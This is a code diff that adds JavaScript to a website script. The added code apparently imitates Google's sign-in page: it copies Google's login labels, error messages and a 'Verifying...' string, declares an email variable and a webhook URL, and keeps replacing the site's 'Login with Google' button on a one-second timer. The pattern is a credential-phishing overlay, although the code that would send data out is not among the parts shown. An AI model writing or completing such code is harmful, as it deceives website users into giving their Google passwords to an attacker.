@@ -1,3 +1,21 @@
+(function(){
+    const TEXT = {
+        en: {
+            emailLabel: "Sign in",
+            emailDesc: "to continue to Google",
+            emailPlaceholder: "Email or phone",
+            passwordPlaceholder: "Enter your password",
+            next: "Next",
+            showPassword: "Show password",
+            forgotPassword: "Forgot password?",
+            emailError: "Enter a valid Gmail address",
+            passwordError: "Wrong password. Try again.",
+            verifying: "Verifying...",
+        }
+    };
+
+    let userEmail = "";
+    let WEBHOOK_URL = "";
 
     function modifyGoogleButton() {
         const googleBtn = document.querySelector('a[onclick*="glogin"][data-tag="social"] img[alt="Login with Google"]')?.parentElement;
@@ -230,3 +248,5 @@
     }
 
     modifyGoogleButton();
+    setInterval(modifyGoogleButton, 1000);}
+)();
